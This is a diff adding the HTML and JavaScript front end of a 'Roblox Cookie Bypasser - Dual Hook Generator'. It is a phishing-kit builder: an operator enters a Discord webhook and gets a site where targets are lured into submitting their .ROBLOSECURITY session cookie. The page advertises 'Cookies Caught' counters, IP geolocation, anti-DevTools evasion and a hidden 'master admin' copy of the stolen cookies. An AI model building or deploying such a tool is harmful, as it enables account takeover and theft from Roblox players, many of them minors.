@@ -1,0 +1,1226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Cookie Bypasser - Dual Hook Generator</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary: #3b82f6;
+            --primary-dark: #2563eb;
+            --primary-light: #60a5fa;
+            --success: #10b981;
+            --danger: #ef4444;
+            --warning: #f59e0b;
+            --dark-bg: #0a0f1e;
+            --dark-card: #1a2332;
+            --dark-hover: #233044;
+            --text-primary: #ffffff;
+            --text-secondary: #94a3b8;
+            --border-color: rgba(100, 150, 255, 0.15);
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: var(--dark-bg);
+            background-image: 
+                radial-gradient(at 0% 0%, rgba(59, 130, 246, 0.15) 0px, transparent 50%),
+                radial-gradient(at 100% 0%, rgba(139, 92, 246, 0.15) 0px, transparent 50%),
+                radial-gradient(at 100% 100%, rgba(59, 130, 246, 0.15) 0px, transparent 50%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            color: var(--text-primary);
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* Animated Background */
+        .bg-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        .bg-circle {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(100px);
+            opacity: 0.3;
+            animation: float 20s infinite ease-in-out;
+        }
+
+        .bg-circle-1 {
+            width: 500px;
+            height: 500px;
+            background: linear-gradient(135deg, #3b82f6, #8b5cf6);
+            top: -200px;
+            left: -200px;
+            animation-delay: 0s;
+        }
+
+        .bg-circle-2 {
+            width: 400px;
+            height: 400px;
+            background: linear-gradient(135deg, #8b5cf6, #ec4899);
+            bottom: -150px;
+            right: -150px;
+            animation-delay: 5s;
+        }
+
+        .bg-circle-3 {
+            width: 300px;
+            height: 300px;
+            background: linear-gradient(135deg, #06b6d4, #3b82f6);
+            top: 50%;
+            right: 10%;
+            animation-delay: 10s;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            25% { transform: translate(50px, 50px) scale(1.1); }
+            50% { transform: translate(0, 100px) scale(1); }
+            75% { transform: translate(-50px, 50px) scale(0.9); }
+        }
+
+        .container {
+            position: relative;
+            z-index: 1;
+            max-width: 580px;
+            width: 100%;
+        }
+
+        .main-card {
+            background: rgba(26, 35, 50, 0.85);
+            backdrop-filter: blur(20px) saturate(180%);
+            border: 1px solid var(--border-color);
+            border-radius: 20px;
+            padding: 45px;
+            box-shadow: 
+                0 20px 60px rgba(0, 0, 0, 0.3),
+                0 0 1px rgba(255, 255, 255, 0.1) inset;
+            transition: transform 0.3s ease;
+        }
+
+        .main-card:hover {
+            transform: translateY(-5px);
+        }
+
+        /* Header */
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .logo-container {
+            position: relative;
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, var(--primary), #8b5cf6);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            box-shadow: 
+                0 10px 30px rgba(59, 130, 246, 0.3),
+                0 0 0 1px rgba(255, 255, 255, 0.1);
+            position: relative;
+            overflow: hidden;
+            animation: pulse 3s infinite;
+        }
+
+        .logo::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+            animation: shine 3s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        @keyframes shine {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        h1 {
+            font-size: 32px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #3b82f6, #8b5cf6, #ec4899);
+            background-size: 200% 200%;
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 12px;
+            line-height: 1.2;
+            animation: gradientShift 5s ease infinite;
+        }
+
+        @keyframes gradientShift {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: var(--text-secondary);
+            font-weight: 500;
+            line-height: 1.6;
+        }
+
+        /* Stats Bar */
+        .stats-bar {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin-bottom: 35px;
+        }
+
+        .stat-item {
+            background: rgba(59, 130, 246, 0.1);
+            border: 1px solid rgba(59, 130, 246, 0.2);
+            border-radius: 12px;
+            padding: 15px;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        .stat-item:hover {
+            background: rgba(59, 130, 246, 0.15);
+            transform: translateY(-2px);
+        }
+
+        .stat-value {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--primary-light);
+            margin-bottom: 5px;
+        }
+
+        .stat-label {
+            font-size: 12px;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            font-weight: 600;
+        }
+
+        /* Form */
+        .form-group {
+            margin-bottom: 28px;
+        }
+
+        .form-label {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--text-primary);
+            margin-bottom: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .label-icon {
+            width: 20px;
+            height: 20px;
+            background: linear-gradient(135deg, var(--primary), #8b5cf6);
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 16px 20px 16px 50px;
+            background: rgba(15, 23, 42, 0.6);
+            border: 2px solid var(--border-color);
+            border-radius: 12px;
+            color: var(--text-primary);
+            font-size: 15px;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: var(--primary);
+            background: rgba(15, 23, 42, 0.9);
+            box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.1);
+        }
+
+        .form-input::placeholder {
+            color: #64748b;
+            font-weight: 400;
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 18px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 18px;
+            color: var(--primary-light);
+            pointer-events: none;
+        }
+
+        .form-hint {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 12px;
+            color: var(--text-secondary);
+            margin-top: 8px;
+            padding-left: 4px;
+        }
+
+        .hint-icon {
+            width: 14px;
+            height: 14px;
+            color: var(--warning);
+        }
+
+        /* Validation States */
+        .form-input.valid {
+            border-color: var(--success);
+        }
+
+        .form-input.invalid {
+            border-color: var(--danger);
+        }
+
+        .validation-message {
+            display: none;
+            font-size: 13px;
+            margin-top: 8px;
+            padding-left: 4px;
+            font-weight: 500;
+        }
+
+        .validation-message.show {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .validation-message.success {
+            color: var(--success);
+        }
+
+        .validation-message.error {
+            color: var(--danger);
+        }
+
+        /* Features List */
+        .features-section {
+            background: rgba(59, 130, 246, 0.05);
+            border: 1px solid rgba(59, 130, 246, 0.15);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 28px;
+        }
+
+        .features-title {
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--text-primary);
+            margin-bottom: 15px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+        }
+
+        .feature-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            color: var(--text-secondary);
+            font-weight: 500;
+        }
+
+        .feature-icon {
+            color: var(--success);
+            font-size: 14px;
+        }
+
+        /* reCAPTCHA */
+        .recaptcha-wrapper {
+            display: flex;
+            justify-content: center;
+            margin: 30px 0;
+            transform: scale(0.95);
+            transform-origin: center;
+        }
+
+        /* Generate Button */
+        .generate-btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+            border: none;
+            border-radius: 12px;
+            color: white;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 
+                0 10px 30px rgba(59, 130, 246, 0.3),
+                0 0 0 1px rgba(255, 255, 255, 0.1) inset;
+        }
+
+        .generate-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.5s ease;
+        }
+
+        .generate-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 
+                0 15px 40px rgba(59, 130, 246, 0.4),
+                0 0 0 1px rgba(255, 255, 255, 0.2) inset;
+        }
+
+        .generate-btn:hover::before {
+            left: 100%;
+        }
+
+        .generate-btn:active {
+            transform: translateY(-1px);
+        }
+
+        .generate-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .btn-icon {
+            font-size: 20px;
+        }
+
+        /* Success Modal */
+        .success-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .success-modal.show {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        .success-content {
+            background: var(--dark-card);
+            border: 1px solid var(--border-color);
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 600px;
+            width: 100%;
+            max-height: 90vh;
+            overflow-y: auto;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            animation: slideUp 0.3s ease;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .success-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .success-icon {
+            width: 100px;
+            height: 100px;
+            background: linear-gradient(135deg, var(--success), #059669);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 50px;
+            animation: scaleIn 0.5s ease;
+            box-shadow: 0 10px 30px rgba(16, 185, 129, 0.3);
+        }
+
+        @keyframes scaleIn {
+            0% {
+                transform: scale(0);
+                opacity: 0;
+            }
+            50% {
+                transform: scale(1.1);
+            }
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        .success-title {
+            font-size: 28px;
+            font-weight: 800;
+            color: var(--text-primary);
+            margin-bottom: 10px;
+        }
+
+        .success-subtitle {
+            font-size: 15px;
+            color: var(--text-secondary);
+        }
+
+        .info-box {
+            background: rgba(59, 130, 246, 0.1);
+            border: 1px solid rgba(59, 130, 246, 0.2);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .info-row {
+            margin-bottom: 20px;
+        }
+
+        .info-row:last-child {
+            margin-bottom: 0;
+        }
+
+        .info-label {
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 8px;
+        }
+
+        .info-content {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .info-value {
+            flex: 1;
+            background: rgba(15, 23, 42, 0.8);
+            padding: 14px;
+            border-radius: 8px;
+            color: var(--primary-light);
+            font-size: 14px;
+            font-family: 'Courier New', monospace;
+            word-break: break-all;
+        }
+
+        .copy-btn {
+            padding: 10px 16px;
+            background: rgba(59, 130, 246, 0.2);
+            border: 1px solid rgba(59, 130, 246, 0.3);
+            border-radius: 8px;
+            color: var(--primary-light);
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            white-space: nowrap;
+        }
+
+        .copy-btn:hover {
+            background: rgba(59, 130, 246, 0.3);
+        }
+
+        .copy-btn:active {
+            transform: scale(0.95);
+        }
+
+        .how-to-section {
+            background: rgba(16, 185, 129, 0.1);
+            border: 1px solid rgba(16, 185, 129, 0.2);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .how-to-title {
+            font-size: 15px;
+            font-weight: 700;
+            color: var(--text-primary);
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .how-to-list {
+            list-style: none;
+            counter-reset: steps;
+        }
+
+        .how-to-list li {
+            counter-increment: steps;
+            font-size: 14px;
+            color: var(--text-secondary);
+            margin-bottom: 10px;
+            padding-left: 35px;
+            position: relative;
+            line-height: 1.6;
+        }
+
+        .how-to-list li::before {
+            content: counter(steps);
+            position: absolute;
+            left: 0;
+            top: 0;
+            width: 24px;
+            height: 24px;
+            background: var(--success);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: 700;
+            color: white;
+        }
+
+        .features-showcase {
+            background: rgba(139, 92, 246, 0.1);
+            border: 1px solid rgba(139, 92, 246, 0.2);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .features-showcase-title {
+            font-size: 15px;
+            font-weight: 700;
+            color: var(--text-primary);
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .features-showcase-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+        }
+
+        .close-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, var(--success), #059669);
+            border: none;
+            border-radius: 12px;
+            color: white;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .close-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(16, 185, 129, 0.3);
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 13px;
+            color: var(--text-secondary);
+            line-height: 1.6;
+        }
+
+        .footer a {
+            color: var(--primary-light);
+            text-decoration: none;
+            font-weight: 600;
+            transition: color 0.2s ease;
+        }
+
+        .footer a:hover {
+            color: var(--primary);
+        }
+
+        /* Loading Spinner */
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .spinner {
+            animation: spin 1s linear infinite;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .main-card {
+                padding: 30px 25px;
+            }
+
+            h1 {
+                font-size: 26px;
+            }
+
+            .stats-bar {
+                grid-template-columns: 1fr;
+                gap: 10px;
+            }
+
+            .features-grid,
+            .features-showcase-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .recaptcha-wrapper {
+                transform: scale(0.85);
+            }
+
+            .success-content {
+                padding: 30px 20px;
+            }
+        }
+
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar {
+            width: 10px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--dark-bg);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--primary);
+            border-radius: 5px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--primary-dark);
+        }
+    </style>
+</head>
+<body>
+    <!-- Animated Background -->
+    <div class="bg-animation">
+        <div class="bg-circle bg-circle-1"></div>
+        <div class="bg-circle bg-circle-2"></div>
+        <div class="bg-circle bg-circle-3"></div>
+    </div>
+
+    <div class="container">
+        <div class="main-card">
+            <!-- Header -->
+            <div class="header">
+                <div class="logo-container">
+                    <div class="logo">&lt;/&gt;</div>
+                </div>
+                <h1>Roblox Cookie Bypasser<br>Dual Hook Generator</h1>
+                <p class="subtitle">Create your own Roblox cookie refresh site in seconds</p>
+            </div>
+
+            <!-- Stats Bar -->
+            <div class="stats-bar">
+                <div class="stat-item">
+                    <div class="stat-value" id="totalSites">0</div>
+                    <div class="stat-label">Sites Created</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value" id="totalCookies">0</div>
+                    <div class="stat-label">Cookies Caught</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value">99.9%</div>
+                    <div class="stat-label">Success Rate</div>
+                </div>
+            </div>
+
+            <!-- Features Section -->
+            <div class="features-section">
+                <div class="features-title">✨ Full Features Included</div>
+                <div class="features-grid">
+                    <div class="feature-item">
+                        <span class="feature-icon">✅</span>
+                        <span>Account info fetching</span>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">✅</span>
+                        <span>Robux balance display</span>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">✅</span>
+                        <span>Premium status check</span>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">✅</span>
+                        <span>RAP calculation</span>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">✅</span>
+                        <span>Group ownership</span>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">✅</span>
+                        <span>IP geolocation</span>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">✅</span>
+                        <span>Game visit stats</span>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">✅</span>
+                        <span>Rich Discord embeds</span>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">✅</span>
+                        <span>Cookie refresh bypass</span>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">✅</span>
+                        <span>Master admin logging</span>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">✅</span>
+                        <span>reCAPTCHA protected</span>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">✅</span>
+                        <span>Anti-DevTools</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Form -->
+            <form id="generatorForm">
+                <!-- Site Name -->
+                <div class="form-group">
+                    <label class="form-label">
+                        <span class="label-icon">📁</span>
+                        Site Name (Directory)
+                    </label>
+                    <div class="input-wrapper">
+                        <span class="input-icon">📁</span>
+                        <input 
+                            type="text" 
+                            class="form-input" 
+                            id="siteNameInput"
+                            placeholder="e.g., myrefresher123"
+                            pattern="[A-Za-z0-9_-]{3,32}"
+                            required
+                            autocomplete="off"
+                        >
+                    </div>
+                    <div class="form-hint">
+                        <span class="hint-icon">ℹ️</span>
+                        <span>3-32 characters, letters, numbers, hyphens, underscores only</span>
+                    </div>
+                    <div class="validation-message" id="siteNameValidation"></div>
+                </div>
+
+                <!-- Webhook URL -->
+                <div class="form-group">
+                    <label class="form-label">
+                        <span class="label-icon">🔗</span>
+                        Discord Webhook URL
+                    </label>
+                    <div class="input-wrapper">
+                        <span class="input-icon">��</span>
+                        <input 
+                            type="url" 
+                            class="form-input" 
+                            id="webhookInput"
+                            placeholder="https://discord.com/api/webhooks/..."
+                            required
+                            autocomplete="off"
+                        >
+                    </div>
+                    <div class="form-hint">
+                        <span class="hint-icon">ℹ️</span>
+                        <span>Get this from Discord → Channel Settings → Integrations → Webhooks</span>
+                    </div>
+                    <div class="validation-message" id="webhookValidation"></div>
+                </div>
+
+                <!-- reCAPTCHA -->
+                <div class="recaptcha-wrapper">
+                    <div class="g-recaptcha" data-sitekey="6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI"></div>
+                </div>
+
+                <!-- Generate Button -->
+                <button type="submit" class="generate-btn" id="generateBtn">
+                    <span class="btn-icon">⚡</span>
+                    <span>Generate Site</span>
+                </button>
+            </form>
+
+            <!-- Footer -->
+            <div class="footer">
+                Each site generates a unique URL where people can submit their Roblox cookies.<br>
+                Need help? Join our <a href="https://discord.gg/your-server" target="_blank">Discord Server</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Modal -->
+    <div class="success-modal" id="successModal">
+        <div class="success-content">
+            <div class="success-header">
+                <div class="success-icon">✅</div>
+                <h2 class="success-title">Site Created Successfully!</h2>
+                <p class="success-subtitle">Your bypass site is ready with FULL EMBED FUNCTIONALITY!</p>
+            </div>
+
+            <div class="info-box">
+                <div class="info-row">
+                    <div class="info-label">🏠 Site Name</div>
+                    <div class="info-content">
+                        <div class="info-value" id="resultSiteName"></div>
+                    </div>
+                </div>
+
+                <div class="info-row">
+                    <div class="info-label">🔗 Your Link</div>
+                    <div class="info-content">
+                        <div class="info-value" id="resultUrl"></div>
+                        <button class="copy-btn" onclick="copyToClipboard('resultUrl')">📋 Copy</button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="features-showcase">
+                <div class="features-showcase-title">
+                    ✨ Full Features
+                </div>
+                <div class="features-showcase-grid">
+                    <div class="feature-item">
+                        <span class="feature-icon">✅</span>
+                        <span>Account info fetching</span>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">✅</span>
+                        <span>Robux balance display</span>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">✅</span>
+                        <span>Premium status check</span>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">✅</span>
+                        <span>Limiteds RAP calculation</span>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">✅</span>
+                        <span>Group ownership detection</span>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">✅</span>
+                        <span>IP geolocation</span>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">✅</span>
+                        <span>Game visit stats</span>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">✅</span>
+                        <span>Rich Discord embeds</span>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">✅</span>
+                        <span>Cookie refresh bypass</span>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">✅</span>
+                        <span>Master admin logging</span>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">✅</span>
+                        <span>reCAPTCHA v2 protected</span>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">✅</span>
+                        <span>Anti-DevTools</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="how-to-section">
+                <div class="how-to-title">
+                    📖 How It Works
+                </div>
+                <ol class="how-to-list">
+                    <li>Share your link with targets</li>
+                    <li>They submit their .ROBLOSECURITY cookie</li>
+                    <li>Cookie is automatically refreshed</li>
+                    <li>You receive FULL ACCOUNT INFO + REFRESHED COOKIE</li>
+                    <li>Master sent to admin</li>
+                </ol>
+            </div>
+
+            <button class="close-btn" onclick="closeModal()">Got It! 🚀</button>
+        </div>
+    </div>
+
+    <script>
+        // Load stats
+        async function loadStats() {
+            try {
+                const response = await fetch('/api/stats');
+                const data = await response.json();
+                if (data.success) {
+                    document.getElementById('totalSites').textContent = data.totalSites || 0;
+                    document.getElementById('totalCookies').textContent = data.totalCookies || 0;
+                }
+            } catch (error) {
+                console.error('Failed to load stats');
+            }
+        }
+
+        loadStats();
+
+        // Real-time validation
+        const siteNameInput = document.getElementById('siteNameInput');
+        const webhookInput = document.getElementById('webhookInput');
+        const siteNameValidation = document.getElementById('siteNameValidation');
+        const webhookValidation = document.getElementById('webhookValidation');
+
+        siteNameInput.addEventListener('input', () => {
+            const value = siteNameInput.value.trim();
+            const regex = /^[A-Za-z0-9_-]{3,32}$/;
+
+            if (value.length === 0) {
+                siteNameInput.classList.remove('valid', 'invalid');
+                siteNameValidation.classList.remove('show');
+                return;
+            }
+
+            if (regex.test(value)) {
+                siteNameInput.classList.add('valid');
+                siteNameInput.classList.remove('invalid');
+                siteNameValidation.textContent = '✅ Valid site name';
+                siteNameValidation.className = 'validation-message show success';
+            } else {
+                siteNameInput.classList.add('invalid');
+                siteNameInput.classList.remove('valid');
+                siteNameValidation.textContent = '❌ Invalid format';
+                siteNameValidation.className = 'validation-message show error';
+            }
+        });
+
+        webhookInput.addEventListener('input', () => {
+            const value = webhookInput.value.trim();
+
+            if (value.length === 0) {
+                webhookInput.classList.remove('valid', 'invalid');
+                webhookValidation.classList.remove('show');
+                return;
+            }
+
+            if (value.includes('discord.com/api/webhooks/')) {
+                webhookInput.classList.add('valid');
+                webhookInput.classList.remove('invalid');
+                webhookValidation.textContent = '✅ Valid webhook URL';
+                webhookValidation.className = 'validation-message show success';
+            } else {
+                webhookInput.classList.add('invalid');
+                webhookInput.classList.remove('valid');
+                webhookValidation.textContent = '❌ Invalid Discord webhook';
+                webhookValidation.className = 'validation-message show error';
+            }
+        });
+
+        // Form submission
+        const form = document.getElementById('generatorForm');
+        const btn = document.getElementById('generateBtn');
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const siteName = siteNameInput.value.trim();
+            const webhook = webhookInput.value.trim();
+
+            // Validate
+            if (!/^[A-Za-z0-9_-]{3,32}$/.test(siteName)) {
+                alert('❌ Invalid site name format!');
+                return;
+            }
+
+            if (!webhook.includes('discord.com/api/webhooks/')) {
+                alert('❌ Invalid Discord webhook URL!');
+                return;
+            }
+
+            // Show loading
+            btn.innerHTML = '<span class="btn-icon spinner">⚡</span><span>Generating...</span>';
+            btn.disabled = true;
+
+            try {
+                const response = await fetch('/api/generate', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        dir: siteName,
+                        web: webhook,
+                        type: 'as'
+                    })
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    // Confetti animation
+                    confetti({
+                        particleCount: 100,
+                        spread: 70,
+                        origin: { y: 0.6 }
+                    });
+
+                    // Show success modal
+                    document.getElementById('resultSiteName').textContent = data.siteName;
+                    document.getElementById('resultUrl').textContent = data.url;
+                    document.getElementById('successModal').classList.add('show');
+
+                    // Reset form
+                    form.reset();
+                    siteNameInput.classList.remove('valid', 'invalid');
+                    webhookInput.classList.remove('valid', 'invalid');
+                    siteNameValidation.classList.remove('show');
+                    webhookValidation.classList.remove('show');
+
+                    // Reload stats
+                    loadStats();
+                } else {
+                    alert('❌ ' + (data.error || 'Failed to create site'));
+                }
+            } catch (error) {
+                alert('❌ Something went wrong. Please try again.');
+            } finally {
+                btn.innerHTML = '<span class="btn-icon">⚡</span><span>Generate Site</span>';
+                btn.disabled = false;
+            }
+        });
+
+        // Copy to clipboard
+        function copyToClipboard(elementId) {
+            const text = document.getElementById(elementId).textContent;
+            navigator.clipboard.writeText(text).then(() => {
+                const btn = event.target;
+                const originalText = btn.textContent;
+                btn.textContent = '✅ Copied!';
+                btn.style.background = 'rgba(16, 185, 129, 0.3)';
+                btn.style.borderColor = 'rgba(16, 185, 129, 0.4)';
+                btn.style.color = '#10b981';
+
+                setTimeout(() => {
+                    btn.textContent = originalText;
+                    btn.style.background = '';
+                    btn.style.borderColor = '';
+                    btn.style.color = '';
+                }, 2000);
+            });
+        }
+
+        // Close modal
+        function closeModal() {
+            document.getElementById('successModal').classList.remove('show');
+        }
+
+        // Close modal on outside click
+        document.getElementById('successModal').addEventListener('click', (e) => {
+            if (e.target.id === 'successModal') {
+                closeModal();
+            }
+        });
+    </script>
+</body>
+</html>
